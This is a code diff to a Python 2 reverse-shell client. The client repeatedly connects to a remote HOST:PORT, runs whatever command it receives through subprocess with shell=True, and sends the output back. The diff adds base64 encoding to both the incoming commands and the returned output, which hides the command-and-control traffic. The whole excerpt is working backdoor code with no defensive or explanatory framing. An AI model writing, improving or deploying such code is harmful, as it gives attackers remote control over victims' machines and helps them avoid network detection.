@@ -3,6 +3,7 @@
 import sys
 import time
 import socket
+import base64
 import datetime
 import subprocess
 
@@ -24,12 +25,13 @@ def main():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             s.connect((HOST, PORT))
-            cmd = s.recv(SIZE)
+            cmd = base64.b64decode(s.recv(SIZE))
             print '[+] ({}) Executing "{}"'.format(datetime.datetime.now(),
                                                    cmd)
             stdout = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                       shell=True).communicate()[0]
-            s.send(stdout)
+            response = base64.b64encode(stdout)
+            s.send(response)
         except socket.error:
             print '[!] ({}) Could not connect to server. Waiting...'.format(datetime.datetime.now())
         finally:
